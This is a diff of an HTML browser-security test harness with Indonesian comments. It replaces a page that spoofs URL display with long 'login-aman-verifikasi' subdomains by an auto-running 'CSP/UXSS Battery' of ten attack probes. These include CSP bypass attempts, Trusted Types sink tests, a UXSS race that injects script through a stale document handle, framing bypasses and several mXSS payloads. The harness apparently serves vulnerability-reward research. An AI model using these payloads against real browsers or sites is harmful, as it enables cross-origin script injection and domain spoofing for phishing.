@@ -1,40 +1,184 @@
-<!-- 19 | ⭐ macOS · label domain DIDORONG KELUAR oleh subdomain panjang | [1-CLICK]
-     Konsekuensi langsung dari 18. Kalau yang tampil cuma label domain, maka pertanyaannya:
-     bagian MANA dari label itu yang dikorbankan lebih dulu saat ia tak muat?
-     Yang benar: eTLD+1 dipertahankan terakhir. Yang sering terjadi: pemotongan dari kanan,
-     sehingga yang terbaca justru bagian yang DIKENDALIKAN PENYERANG (subdomain), dan
-     eTLD+1 yang sebenarnya terdorong keluar layar.
-     Diuji berjenjang: subdomain 20 / 40 / 80 / 160 / 320 karakter, di jendela yang menyempit.
-     Yang dicari SATU ANGKA: pada panjang berapa eTLD+1 berhenti terbaca?
-     CATATAN  butuh wildcard DNS ke origin-mu supaya subdomain benar-benar resolve. Tanpa itu,
-     file ini tetap berguna sebagai pengukur ELISI di jendela sempit (tombol kedua).
-     EXPECTED-SECURE  eTLD+1 selalu terbaca, di panjang & lebar berapa pun. -->
-<button onclick="win()">Buka 5 jendela dgn lebar menurun</button>
-<button onclick="sub()">Uji subdomain panjang (butuh wildcard DNS)</button>
-<input id=d value="xnxrx.github.io" style="width:220px;font:13px monospace">
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<title>CSP/UXSS Battery #2</title>
+<style>
+ body{font:13px/1.6 ui-monospace,monospace;background:#0b0e14;color:#cdd9e5;padding:18px}
+ table{border-collapse:collapse;width:100%;max-width:1150px;margin-top:10px}
+ th,td{border:1px solid #2a3240;padding:5px 8px;vertical-align:top}th{background:#151b24}
+ .vuln{color:#ff6b63;font-weight:700}.echo{color:#d29922}.blk{color:#8b949e}.ok{color:#3fb950}
+ button{background:#1f6feb;color:#fff;border:0;padding:5px 10px;border-radius:5px;cursor:pointer}
+ #sink{position:absolute;left:-9999px;width:1px;height:1px}#ban{font-size:15px}
+</style>
+</head>
+<body>
+<h3>CSP / UXSS Battery #2 <small>— auto-run, Chrome asli</small></h3>
+<div id="ban" class="blk">memulai...</div>
+<div id="tb"></div><div id="sink"></div>
 <script>
-g.textContent = 'REAL ORIGIN: ' + location.href;
-function win() {
-  [560, 420, 320, 240, 180].forEach(function (w, i) {
-    setTimeout(function () {
-      var p = window.open(location.href, 'w' + w, 'width=' + w + ',height=300,left=' + (30 + i * 40) + ',top=' + (60 + i * 60));
-      if (p) p.focus();
-    }, i * 400);
-  });
-  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n5 jendela dibuka (560/420/320/240/180 px).' +
-    '\n\nBaca label domain tiap jendela. Pada lebar berapa host berhenti terbaca utuh?';
-}
-function sub() {
-  [20, 40, 80, 160, 320].forEach(function (n, i) {
-    setTimeout(function () {
-      var host = 'login-aman-verifikasi'.repeat(Math.ceil(n / 21)).slice(0, n) + '.' + d.value.trim();
-      window.open('https://' + host + '/', '_blank');
-    }, i * 500);
-  });
-  g.textContent = 'REAL ORIGIN: ' + location.origin +
-    '\n5 tab dibuka dgn subdomain 20/40/80/160/320 karakter.' +
-    '\n\nTanpa wildcard DNS semuanya akan error — TAPI halaman error pun menampilkan host,' +
-    '\njadi tetap terukur: pada panjang berapa eTLD+1 tak lagi terbaca?';
-}
+const T='https://example.com/';
+const K='n'+Math.random().toString(36).slice(2,10);            // nonce harness
+const S =s=>'<scr'+'ipt>'+s+'</scr'+'ipt>';
+const SN=s=>'<scr'+'ipt nonce="'+K+'">'+s+'</scr'+'ipt>';
+const M =p=>'<meta http-equiv="Content-Security-Policy" content="'+p+'">';
+const PAY=id=>`(window.opener||window.top).postMessage('UXSS|${id}|'+location.origin,'*');alert('UXSS[${id}] @ '+document.domain);`;
+const tick=()=>new Promise(r=>setTimeout(r,0)), sleep=m=>new Promise(r=>setTimeout(r,m));
+const frame=(sd,at)=>{const f=document.createElement('iframe');f.width=f.height=1;
+  if(at)for(const k in at)f.setAttribute(k,at[k]); if(sd!==undefined)f.srcdoc=sd; sink.appendChild(f); return f};
+const put=(id,t,c)=>{const e=document.getElementById('s'+id); if(!e)return;
+  e.innerHTML+=(e.innerHTML?'<br>':'')+'<span class='+c+'>'+t+'</span>'};
+
+/* ---- GERBANG: EXEC di konteks ber-CSP = pelanggaran; UXSS hanya jika origin==example.com ---- */
+addEventListener('message',e=>{
+  const d=e.data; if(typeof d!=='string')return;
+  const p=d.split('|');
+  if(p[0]==='CSPX'){
+    const bad=/EXEC|RAN|OK-/.test(p[2]);
+    if(p[2]==='CONTROL-INLINE-RAN'){put(p[1],'HARNESS-INVALID: meta-CSP tidak aktif','echo');return}
+    put(p[1],(bad?'CSP-BYPASS · ':'')+p[2], bad?'vuln':'blk');
+  }
+  if(p[0]==='UXSS'){
+    const real=(e.origin==='https://example.com')||(p[2]==='https://example.com');
+    put(p[1],(real?'UXSS-CONFIRMED · ':'echo (bukan temuan) · ')+p[2], real?'vuln':'echo');
+    if(real)ban.innerHTML='<span class=vuln>*** SOP JEBOL di '+p[2]+' — screenshot, STOP, lapor VRP ***</span>';
+  }
+});
+
+/* --------------------------------- 10 ARM --------------------------------- */
+const ARMS=[
+{id:'B1',m:'auto',n:'CSP inheritance sweep (about:blank / srcdoc / blob / data / javascript:)',
+ w:'skema lokal WAJIB mewarisi CSP induk; kalau skripnya jalan = CSP hilang saat pewarisan',
+ run:()=>{const boot=`
+   const S=s=>'<scr'+'ipt>'+s+'</scr'+'ipt>';const R=m=>top.postMessage('CSPX|B1|'+m,'*');
+   try{const i=document.createElement('iframe');document.body.appendChild(i);
+       i.contentDocument.write(S('top.postMessage("CSPX|B1|about:blank EXEC","*")'))}catch(e){R('about:blank '+e.name)}
+   try{const i=document.createElement('iframe');i.srcdoc=S('top.postMessage("CSPX|B1|srcdoc EXEC","*")');document.body.appendChild(i)}catch(e){R('srcdoc '+e.name)}
+   try{const u=URL.createObjectURL(new Blob([S('top.postMessage("CSPX|B1|blob EXEC","*")')],{type:'text/html'}));
+       const i=document.createElement('iframe');i.src=u;document.body.appendChild(i)}catch(e){R('blob '+e.name)}
+   try{const i=document.createElement('iframe');i.src='data:text/html,'+encodeURIComponent(S('top.postMessage("CSPX|B1|data EXEC","*")'));document.body.appendChild(i)}catch(e){R('data '+e.name)}
+   try{const i=document.createElement('iframe');i.src='javascript:top.postMessage("CSPX|B1|js-url EXEC","*")';document.body.appendChild(i)}catch(e){R('js-url '+e.name)}
+   R('boot-ok (nonce hidup)');`;
+   frame(M("script-src 'nonce-"+K+"'")+'<body>'+SN(boot)+S('top.postMessage("CSPX|B1|CONTROL-INLINE-RAN","*")'));
+   return 'lima skema lokal diuji'}},
+
+{id:'B2',m:'auto',n:'atribut csp= (embedded enforcement) di frame skema lokal',
+ w:'kebijakan yang dipasang embedder harus ikut ke dokumen anak',
+ run:()=>{frame(S('top.postMessage("CSPX|B2|srcdoc-under-csp-attr EXEC","*")'),{csp:"script-src 'none'"});
+   const u=URL.createObjectURL(new Blob([S('top.postMessage("CSPX|B2|blob-under-csp-attr EXEC","*")')],{type:'text/html'}));
+   const f=document.createElement('iframe');f.setAttribute('csp',"script-src 'none'");f.src=u;sink.appendChild(f);
+   return 'csp-attr dipasang di srcdoc + blob'}},
+
+{id:'B3',m:'auto',n:'Trusted Types sink sweep (7 jalur)',
+ w:'require-trusted-types-for harus menutup SEMUA sink, bukan cuma innerHTML',
+ run:()=>{const boot=`
+   const R=m=>top.postMessage('CSPX|B3|'+m,'*');const bad='<img src=x onerror="top.postMessage(\\'CSPX|B3|'+'SINK EXEC\\',\\'*\\')">';
+   const d=document.createElement('div');document.body.appendChild(d);
+   const t=[['innerHTML',()=>d.innerHTML=bad],['outerHTML',()=>d.cloneNode().outerHTML=bad],
+     ['setHTMLUnsafe',()=>d.setHTMLUnsafe(bad)],['insertAdjacentHTML',()=>d.insertAdjacentHTML('beforeend',bad)],
+     ['createContextualFragment',()=>d.append(document.createRange().createContextualFragment(bad))],
+     ['DOMParser+adopt',()=>d.append(document.adoptNode(new DOMParser().parseFromString(bad,'text/html').body.firstChild))],
+     ['iframe.srcdoc',()=>{const i=document.createElement('iframe');i.srcdoc=bad;document.body.appendChild(i)}]];
+   for(const [n,fn] of t){try{fn();R(n+' LOLOS-TT')}catch(e){R(n+':'+e.name)}}`;
+   frame(M("require-trusted-types-for 'script'; script-src 'nonce-"+K+"' 'unsafe-inline'")+'<body>'+SN(boot));
+   return '7 sink dicoba di bawah Trusted Types'}},
+
+{id:'B4',m:'auto',n:'escape lewat Worker / Worklet / import() dinamis',
+ w:'worker-src & worklet jatuh ke script-src; blob/data harus tetap diblok',
+ run:()=>{const boot=`
+   const R=m=>top.postMessage('CSPX|B4|'+m,'*');
+   const js="top.postMessage('CSPX|B4|WORKER EXEC','*')";
+   const wjs="self.postMessage('x')";
+   try{const u=URL.createObjectURL(new Blob([wjs],{type:'text/javascript'}));
+       const w=new Worker(u);w.onmessage=()=>R('blob-Worker EXEC')}catch(e){R('blob-Worker:'+e.name)}
+   try{const w=new Worker('data:text/javascript,'+encodeURIComponent(wjs));w.onmessage=()=>R('data-Worker EXEC')}catch(e){R('data-Worker:'+e.name)}
+   try{import('data:text/javascript,'+encodeURIComponent(js)).then(()=>R('import(data:) EXEC')).catch(e=>R('import(data:):'+e.name))}catch(e){R('import:'+e.name)}
+   try{const u=URL.createObjectURL(new Blob([js],{type:'text/javascript'}));
+       CSS.paintWorklet.addModule(u).then(()=>R('paintWorklet EXEC')).catch(e=>R('paintWorklet:'+e.name))}catch(e){R('worklet:'+e.name)}`;
+   frame(M("script-src 'nonce-"+K+"'")+'<body>'+SN(boot));
+   return 'worker/worklet/import diuji'}},
+
+{id:'B5',m:'auto',n:'document.open() me-reset CSP dokumen anak',
+ w:'membuka ulang dokumen tidak boleh membuang kebijakan yang sudah terpasang',
+ run:async()=>{const f=frame(M("script-src 'nonce-"+K+"'")+'<body>ready');await sleep(400);
+   try{const d=f.contentDocument;d.open();d.write(S('top.postMessage("CSPX|B5|post-open EXEC","*")'));d.close();
+     return 'document.open()+write dilakukan'}catch(e){return 'BLOCKED:'+e.name}}},
+
+{id:'B6',m:'1-click',n:'UXSS: handle document hidup lebih lama dari perubahan origin',
+ w:'referensi document/location diambil sebelum pindah ke example.com, lalu dipakai sesudahnya',
+ run:async()=>{const w=open('about:blank','vic6');if(!w)return 'popup diblok';
+   const D=w.document, L=w.location; D.write('<h1>pre-nav</h1>');
+   L.href=T; const t0=performance.now(); let n=0;
+   while(performance.now()-t0<1800){
+     try{const s=D.createElement('script');s.text=PAY('B6');(D.documentElement||D).appendChild(s);n++}catch(e){}
+     try{D.write(S(PAY('B6')))}catch(e){}
+     try{L.href='javascript:'+PAY('B6')}catch(e){}
+     await tick()}
+   return n+' suntikan lewat handle lama'}},
+
+{id:'B7',m:'auto',n:'desync: mutasi sandbox pasca-load + navigasi same-document',
+ w:'flag sandbox/CSP dihitung saat load; mutasi setelahnya tidak boleh menghidupkan skrip',
+ run:async()=>{const f=frame(S('top.postMessage("CSPX|B7|sandboxed EXEC","*")'),{sandbox:''});
+   await sleep(400); f.removeAttribute('sandbox');
+   try{f.contentWindow.location.hash='#poke'}catch(e){}
+   await sleep(300); f.setAttribute('sandbox','allow-scripts allow-same-origin');
+   try{f.contentWindow.location.hash='#poke2'}catch(e){}
+   try{const d=f.contentDocument;if(d){const s=d.createElement('script');s.text='top.postMessage("CSPX|B7|post-mutation EXEC","*")';
+     d.documentElement.appendChild(s);return 'skrip disuntik pasca-mutasi'}}catch(e){return 'BLOCKED:'+e.name}
+   return 'mutasi selesai, tanpa handle'}},
+
+{id:'B8',m:'auto',n:"gadget 'strict-dynamic': script dinamis ber-src blob/data",
+ w:"strict-dynamic mempercayai script yang dibuat script tepercaya — termasuk yang src-nya blob/data",
+ run:()=>{const boot=`
+   const R=m=>top.postMessage('CSPX|B8|'+m,'*');const js="top.postMessage('CSPX|B8|dyn-script EXEC','*')";
+   try{const s=document.createElement('script');s.src=URL.createObjectURL(new Blob([js],{type:'text/javascript'}));
+       s.onerror=()=>R('blob-src diblok');document.body.appendChild(s)}catch(e){R('blob-src:'+e.name)}
+   try{const s=document.createElement('script');s.src='data:text/javascript,'+encodeURIComponent(js);
+       s.onerror=()=>R('data-src diblok');document.body.appendChild(s)}catch(e){R('data-src:'+e.name)}
+   try{const s=document.createElement('script');s.text=js;document.body.appendChild(s);R('text-node ok')}catch(e){R('text:'+e.name)}`;
+   frame(M("script-src 'nonce-"+K+"' 'strict-dynamic'")+'<body>'+SN(boot));
+   return 'tiga gadget dinamis ditembak'}},
+
+{id:'B9',m:'auto',n:'bypass kontrol framing (object/embed/fencedframe/portal) + rebut handle',
+ w:'frame-ancestors & XFO hanya menutup <iframe>; wadah lain kadang lolos',
+ run:async()=>{let r=[];
+   for(const tag of ['object','embed','fencedframe','portal']){
+     let o;try{o=document.createElement(tag)}catch(e){r.push(tag+':unsupported');continue}
+     if(tag==='object'){o.data=T;o.type='text/html'}else o.src=T;
+     o.width=o.height=1;try{sink.appendChild(o)}catch(e){r.push(tag+':append '+e.name);continue}
+     await sleep(800);
+     try{const d=o.contentDocument||(o.getSVGDocument&&o.getSVGDocument());
+       if(d&&d.documentElement){const s=d.createElement('script');s.text=PAY('B9');d.documentElement.appendChild(s);r.push(tag+' HANDLE!')}
+       else r.push(tag+':null')}catch(e){r.push(tag+':'+e.name)}}
+   return r.join(' | ')}},
+
+{id:'B10',m:'auto',n:'mXSS: payload dibuat mutasi jadi markup eksekutabel lewat round-trip innerHTML',
+ w:'serializer + parser tidak simetris — hasil round-trip berbeda dari input',
+ run:()=>{const boot=`
+   const R=m=>top.postMessage('CSPX|B10|'+m,'*');const hit="top.postMessage('CSPX|B10|mXSS EXEC','*')";
+   const P=['<noscript><p title="</noscript><img src=x onerror='+JSON.stringify(hit)+'>">',
+            '<svg></p><style><a id="</style><img src=x onerror='+JSON.stringify(hit)+'>">',
+            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror='+JSON.stringify(hit)+'>',
+            '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror='+JSON.stringify(hit)+'>',
+            '<template><div><style></template><img src=x onerror='+JSON.stringify(hit)+'>'];
+   let mut=0;
+   P.forEach((p,i)=>{const d=document.createElement('div');document.body.appendChild(d);
+     try{d.innerHTML=p;const a=d.innerHTML;d.innerHTML=a;const b=d.innerHTML;
+       if(a!==b){mut++;R('payload#'+i+' BERMUTASI saat round-trip')}}catch(e){R('#'+i+':'+e.name)}});
+   R(mut?'mutasi terdeteksi: '+mut+'/5':'nol mutasi (parser simetris)');`;
+   frame('<body>'+S(boot));
+   return '5 payload mXSS di-round-trip'}},
+];
+
+/* ------------------------------ UI + AUTORUN ------------------------------ */
+tb.innerHTML='<table><tr><th>ID</th><th>Mode</th><th>Mekanisme</th><th>Yang diuji</th><th>Aksi</th><th>Sinyal</th></tr>'+
+ ARMS.map(a=>`<tr><td>${a.id}</td><td>${a.m}</td><td>${a.n}</td><td>${a.w}</td>
+ <td><button data-i="${a.id}">run</button></td><td id="s${a.id}" class="blk">-</td></tr>`).join('')+'</table>';
+const fire=async i=>{const a=ARMS.find(x=>x.id===i);put(i,'jalan...','blk');
+  try{put(i,await a.run(),'blk')}catch(e){put(i,'ERR '+e.name,'blk')}};
+tb.onclick=e=>{const i=e.target.dataset&&e.target.dataset.i;if(i)fire(i)};
+addEventListener('load',async()=>{ban.textContent='auto-run arm 0-click...';
+  for(const a of ARMS)if(a.m==='auto'){await fire(a.id);await sleep(250)}
+  if(ban.className!=='vuln')ban.innerHTML='<span class=ok>selesai — B6 (1-click) tekan tombolnya sendiri</span>';});
 </script>
+</body></html>
